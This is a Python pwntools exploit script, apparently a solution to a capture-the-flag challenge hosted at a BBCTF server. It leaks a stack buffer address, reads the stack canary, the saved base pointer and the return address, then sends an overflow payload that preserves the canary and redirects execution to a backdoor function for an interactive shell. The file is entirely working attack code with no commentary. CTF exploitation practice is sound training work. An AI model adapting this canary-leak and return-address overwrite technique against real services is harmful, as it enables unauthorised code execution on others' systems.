from pwn import *
import binascii

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./vuln"

elf, rop = ELF(vuln_path), ROP(vuln_path)

if not f_remote:
    io = process(vuln_path)
else:
    io = remote("pwn.bbctf.fluxus.co.in", 4002)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


def bytesTostr(bs):
    return binascii.b2a_hex(bs)


def hexbytesTobytes(b):
    return bytearray.fromhex(b.decode('utf-8'))


io.recvuntil("0x", drop=True)
buf_address = int(io.recv(12), 16)
success("buf_address -> " + hex(buf_address))

canary_address_buf = p64(buf_address + 0x18)
io.sendlineafter(b"bytes:\n", bytesTostr(canary_address_buf))
io.recvuntil(b":\n", drop=True)
canary = io.recv(16)

rbp = p64(buf_address + 0x20)
io.sendlineafter(b"bytes:\n", bytesTostr(rbp))
io.recvuntil(b":\n", drop=True)
rbp = io.recv(16)

ret = p64(buf_address + 0x28)
io.sendlineafter(b"bytes:\n", bytesTostr(ret))
io.recvuntil(b":\n", drop=True)
ret = u64(hexbytesTobytes(io.recv(16)))

backdoor = ret - 26 - (0xa07 - 0x8f7)

c = hexbytesTobytes(canary)
r = hexbytesTobytes(rbp)
io.sendlineafter(b"bytes:\n", bytesTostr(p64(buf_address)) + b"a" * 8 + c + r + p64(backdoor))

io.interactive()
